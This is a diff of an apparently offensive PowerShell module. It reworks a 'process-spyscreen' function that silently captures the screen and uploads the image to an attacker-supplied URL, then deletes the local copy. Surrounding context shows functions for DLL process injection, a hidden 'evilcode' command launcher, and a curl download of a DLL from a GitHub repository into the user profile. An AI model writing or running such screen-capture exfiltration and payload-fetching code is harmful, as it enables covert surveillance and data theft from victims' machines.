@@ -356,28 +356,31 @@ Export-ModuleMember -Function process-injectionDll
 Set-Alias -Name process-injectionDll -Value process-injectionDll
 
 function process-spyscreen {
-param (
-    [string]$atk
-)
-[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
-function screenshot([Drawing.Rectangle]$bounds, $path) {
-   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
-   $graphics = [Drawing.Graphics]::FromImage($bmp)
-   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-   $bmp.Save($path)
-   $graphics.Dispose()
-   $bmp.Dispose()
+    param (
+        [string]$atk = $null
+    )
+    [Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
+    function screenshot([Drawing.Rectangle]$bounds, $path) {
+        $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+        $graphics = [Drawing.Graphics]::FromImage($bmp)
+        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+        $bmp.Save($path)
+        $graphics.Dispose()
+        $bmp.Dispose()
+    }
+    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1024)
+    $timestamp = (Get-Date).ToString("HH-mm-ss")
+    $screenshotPath = "C:\Users\Public\screenshot_$timestamp.png"
+    screenshot $bounds $screenshotPath
+    if ($atk) {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.UploadFile($atk, $screenshotPath) > $null 2>&1
+        sleep(0.3)
+        Remove-Item -Path $screenshotPath -Force -ErrorAction SilentlyContinue
+    }
+    # Když není $atk, screenshot zůstane v C:\Users\Public\
 }
-$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1024)
-$timestamp = (Get-Date).ToString("HH-mm-ss")
-$screenshotPath = "C:\Users\Public\screenshot_$timestamp.png"
-screenshot $bounds $screenshotPath
-$webClient = New-Object System.Net.WebClient
-$webClient.UploadFile($atk, $screenshotPath) > $null 2>&1
-sleep(0.3)
-Remove-Item -Path $screenshotPath -Force -ErrorAction SilentlyContinue
-}
-Export-ModuleMember -Function process-spyscreen 
+Export-ModuleMember -Function process-spyscreen
 Set-Alias -Name process-spyscreen -Value process-spyscreen
 
 
@@ -645,6 +648,7 @@ CreateObject("WScript.Shell").Run "$command", 0, False
 Export-ModuleMember -Function pop-babylon-evilcode
 Set-Alias -Name pop-babylon-evilcode -Value pop-babylon-evilcode
 
+
 #POC for Windows (over exe file)
 function process-aucdown {
 curl https://github.com/sc4r3c0d3/tsk2lvgen/raw/refs/heads/main/mcucbps.dll -o $env:USERPROFILE\mcucbps.dll
@@ -668,5 +672,4 @@ function getipinfo {
 }
 Export-ModuleMember -Function getipinfo
 Set-Alias -Name getipinfo -Value getipinfo
-
 
